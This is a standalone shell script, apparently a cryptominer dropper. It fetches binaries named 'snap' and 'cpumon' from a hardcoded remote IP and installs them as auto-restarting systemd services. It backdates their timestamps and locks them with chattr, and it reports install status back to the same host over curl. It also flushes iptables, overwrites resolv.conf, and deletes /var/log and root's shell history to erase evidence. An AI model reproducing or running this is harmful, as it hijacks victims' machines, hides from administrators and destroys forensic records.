#!/bin/sh
systemctl is-enabled snap.service
        if [ $? -eq 0 ]; then
	curl -s -m 5 http://106.12.40.198:22222/test/snapOK >/dev/null 2>&1
        else
	systemctl enable snap.service
	systemctl start snap.service
	systemctl is-enabled snap.service
		if [ $? -eq 0 ]; then
		curl -s -m 5 http://106.12.40.198:22222/test/snapUP >/dev/null 2>&1
		else
		chattr -iau snap*
		chattr -iau /usr/sbin/snap*
		chattr -iau /lib/systemd/system/snap*
		rm -rf /usr/sbin/snap*
		rm -rf /lib/systemd/system/snap*
		curl -s -m 5 -O http://106.12.40.198:22222/test/snap && mv snap /usr/sbin && touch -t201503082213 /usr/sbin/snap && chmod +x /usr/sbin/snap
		echo "[Unit]" > snap.service
		echo "Description=snap" >> snap.service
		echo "After=multi-user.target" >> snap.service
		echo "" >> snap.service
		echo "[Service]" >> snap.service
		echo "Type=simple" >> snap.service
		echo "ExecStart=/usr/sbin/snap" >> snap.service
		echo "Restart=always" >> snap.service
		echo "RestartSec=60" >> snap.service
		echo "" >> snap.service
		echo "[Install]" >> snap.service
		echo "WantedBy=multi-user.target" >> snap.service
		mv snap.service /lib/systemd/system && touch -t201503082214 /lib/systemd/system/snap.service && chmod 644 /lib/systemd/system/snap.service
		systemctl daemon-reload
		systemctl enable snap.service
		systemctl start snap.service
		systemctl is-enabled snap.service
			if [ $? -eq 0 ]; then
	                curl -s -m 5 http://106.12.40.198:22222/test/snapON >/dev/null 2>&1
        	        else
			curl -s -m 5 http://106.12.40.198:22222/test/snapOFF >/dev/null 2>&1
			fi
	        fi
	fi
ps auxf | grep "usr/sbin/cpumon" | grep -v grep
	if [ $? -eq 0 ]; then
        curl -s -m 5 http://106.12.40.198:22222/test/cpumonOK
	iptables -F
	echo "nameserver 8.8.8.8" > /etc/resolv.conf
        systemctl restart cpumon.service
        else
        curl -s -m 5 http://106.12.40.198:22222/test/cpumonBAD
        chattr -iau /usr/cpu
        chattr -iau /usr/sbin/cpumon
        rm -rf /usr/sbin/cpumon
        rm -rf cpumon
        rm -rf cpumon.service
	curl -s -m 5 -O http://106.12.40.198:22222/test/cpu && mv cpu /usr/ && touch -t201503110313 /usr/cpu && chattr +iau /usr/cpu
        curl -O http://106.12.40.198:22222/test/cpumon && mv cpumon /usr/sbin/ && touch -t201503110314 /usr/sbin/cpumon && chmod +x /usr/sbin/cpumon
        echo "[Unit]" > cpumon.service
        echo "Description=cpumon" >> cpumon.service
        echo "After=multi-user.target" >> cpumon.service
        echo "" >> cpumon.service
        echo "[Service]" >> cpumon.service
        echo "Type=forking" >> cpumon.service
        echo "ExecStart=/usr/sbin/cpumon -c /usr/cpu -t $(nproc)" >> cpumon.service
        echo "Restart=always" >> cpumon.service
        echo "RestartSec=60" >> cpumon.service
        echo "" >> cpumon.service
        echo "[Install]" >> cpumon.service
        echo "WantedBy=multi-user.target" >> cpumon.service
                if test -d /lib/systemd/system; then
                chattr -iau /lib/systemd/system/cpumon.service
                rm -rf /lib/systemd/system/cpumon.service
                mv cpumon.service /lib/systemd/system/ && touch -t201503081212 /lib/systemd/system/cpumon.service && chmod 644 /lib/systemd/system/cpumon.service
                else
                chattr -iau /usr/lib/systemd/system/cpumon.service
                rm -rf /usr/lib/systemd/system/cpumon.service
                mv cpumon.service /usr/lib/systemd/system/ && touch -t201503081212 /usr/lib/systemd/system/cpumon.service && chmod 644 /usr/lib/systemd/system/cpumon.service
                fi
        systemctl daemon-reload
        systemctl enable cpumon.service
        systemctl start cpumon.service
        sleep 5
	ps auxf | grep "usr/sbin/cpumon" | grep -v grep
        		if [ $? -eq 0 ]; then
			curl -s -m 5 http://106.12.40.198:22222/test/cpumonON
			else
			curl -s -m 5 http://106.12.40.198:22222/test/cpumonOFF
			fi
	fi

chattr -R -aui /var/log/
chattr -aui /var/log/*
rm -rf /var/log
rm -rf /root/.bash_history
history -cw
